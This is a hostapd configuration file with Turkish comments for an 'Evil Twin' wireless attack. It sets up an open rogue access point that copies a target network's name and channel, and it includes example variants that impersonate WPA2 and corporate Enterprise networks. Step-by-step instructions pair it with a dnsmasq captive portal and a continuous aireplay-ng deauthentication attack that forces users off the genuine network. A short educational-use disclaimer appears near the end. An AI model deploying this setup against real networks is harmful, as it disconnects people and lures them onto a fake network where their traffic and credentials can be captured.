# Evil Twin Saldırısı - Hostapd Yapılandırma Dosyası
# Bu dosya sahte erişim noktası (Evil Twin) ayarlarını içerir

# ============================================================================
# TEMEL ARAYÜZ AYARLARI
# ============================================================================

# Kablosuz arayüz (monitor mode'da olmalı)
interface=wlan0

# Sürücü türü (nl80211 modern kartlar için önerilir)
driver=nl80211

# ============================================================================
# ERIŞIM NOKTASI AYARLARI
# ============================================================================

# SSID (Ağ adı) - Hedef ağ ile aynı olmalı
# Örnek: ssid=TARGET_NETWORK_NAME
ssid=Free_WiFi

# Kanal (Hedef ağ ile aynı kanal kullanın)
# 1-11 arası (2.4GHz) veya 36-165 arası (5GHz)
channel=6

# Ülke kodu (Türkiye için TR)
country_code=TR

# IEEE 802.11 standardı
# a = 5GHz, b = 2.4GHz eski, g = 2.4GHz, n = 2.4/5GHz
ieee80211n=1
ieee80211g=1

# ============================================================================
# GÜVENLİK AYARLARI (Evil Twin için açık ağ)
# ============================================================================

# Güvenlik protokolü (0 = Açık ağ, 1 = WEP, 2 = WPA/WPA2)
# Evil Twin saldırısı için genellikle açık ağ kullanılır
auth_algs=1

# WPA ayarları (Evil Twin için genellikle kapalı)
# wpa=0 (kapalı), wpa=1 (WPA), wpa=2 (WPA2), wpa=3 (WPA+WPA2)
wpa=0

# WPA şifresi (sadece WPA aktifse)
# wpa_passphrase=YourPassword

# WPA anahtar yönetimi
# wpa_key_mgmt=WPA-PSK

# Şifreleme algoritması
# wpa_pairwise=TKIP CCMP
# rsn_pairwise=CCMP

# ============================================================================
# PERFORMANS VE KAPASITE AYARLARI
# ============================================================================

# Maksimum bağlantı sayısı
max_num_sta=50

# Beacon interval (milisaniye)
beacon_int=100

# DTIM period
dtim_period=2

# RTS threshold
rts_threshold=2347

# Fragmentation threshold
fragm_threshold=2346

# ============================================================================
# GELIŞMIŞ AYARLAR
# ============================================================================

# MAC adresi filtreleme (0 = kapalı, 1 = açık)
macaddr_acl=0

# Gizli SSID (0 = görünür, 1 = gizli)
ignore_broadcast_ssid=0

# WMM (Wi-Fi Multimedia) desteği
wmm_enabled=1

# HT (High Throughput) yetenekleri
ht_capab=[HT40+][SHORT-GI-20][SHORT-GI-40][DSSS_CCK-40]

# ============================================================================
# CAPTIVE PORTAL AYARLARI
# ============================================================================

# Captive portal için ek ayarlar
# Bu ayarlar kullanıcıları otomatik olarak giriş sayfasına yönlendirir

# DHCP ile verilen DNS sunucusu (kendi IP'miz)
# Bu ayar dnsmasq.conf dosyasında yapılır

# ============================================================================
# LOG VE DEBUG AYARLARI
# ============================================================================

# Log seviyesi (0 = minimum, 4 = maksimum)
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2

# Debug ayarları (geliştirme için)
# debug=1
# dump_file=/tmp/hostapd.dump

# ============================================================================
# ÖRNEK YAPILANDIRMALAR
# ============================================================================

# ÖRNEK 1: Açık ağ (Evil Twin için standart)
# ssid=TARGET_NETWORK
# channel=6
# wpa=0

# ÖRNEK 2: WPA2 korumalı ağ (gelişmiş Evil Twin)
# ssid=TARGET_NETWORK
# channel=6
# wpa=2
# wpa_passphrase=password123
# wpa_key_mgmt=WPA-PSK
# wpa_pairwise=TKIP CCMP
# rsn_pairwise=CCMP

# ÖRNEK 3: Enterprise ağ (WPA2-Enterprise)
# ssid=CORPORATE_NETWORK
# channel=6
# wpa=2
# wpa_key_mgmt=WPA-EAP
# auth_server_addr=127.0.0.1
# auth_server_port=1812
# auth_server_shared_secret=radius_secret

# ============================================================================
# KULLANIM TALİMATLARI
# ============================================================================

# 1. Bu dosyayı hedef ağa göre düzenleyin:
#    - ssid: Hedef ağın adını yazın
#    - channel: Hedef ağın kanalını ayarlayın
#    - interface: Kendi kablosuz arayüzünüzü belirtin

# 2. Hostapd'yi başlatın:
#    sudo hostapd /path/to/this/hostapd.conf

# 3. Başka bir terminalde DHCP sunucusunu başlatın:
#    sudo dnsmasq -C /path/to/dnsmasq.conf

# 4. Deauthentication saldırısını başlatın:
#    sudo aireplay-ng --deauth 0 -a [TARGET_BSSID] wlan1mon

# ============================================================================
# GÜVENLİK UYARILARI
# ============================================================================

# ⚠️ Bu yapılandırma yalnızca eğitim amaçlıdır
# ⚠️ Kendi ağlarınızda veya izin aldığınız sistemlerde kullanın
# ⚠️ İzinsiz kullanım yasalara aykırıdır
# ⚠️ Etik kurallara uygun hareket edin

# ============================================================================
# SORUN GİDERME
# ============================================================================

# Hostapd başlamazsa:
# 1. Arayüzün monitor mode'da olduğunu kontrol edin
# 2. Başka servislerin arayüzü kullanmadığını kontrol edin
# 3. Sürücü desteğini kontrol edin
# 4. Log dosyalarını inceleyin

# Yaygın hatalar:
# - "Device or resource busy": Arayüz başka servis tarafından kullanılıyor
# - "Operation not supported": Sürücü monitor mode desteklemiyor
# - "No such device": Arayüz adı yanlış veya mevcut değil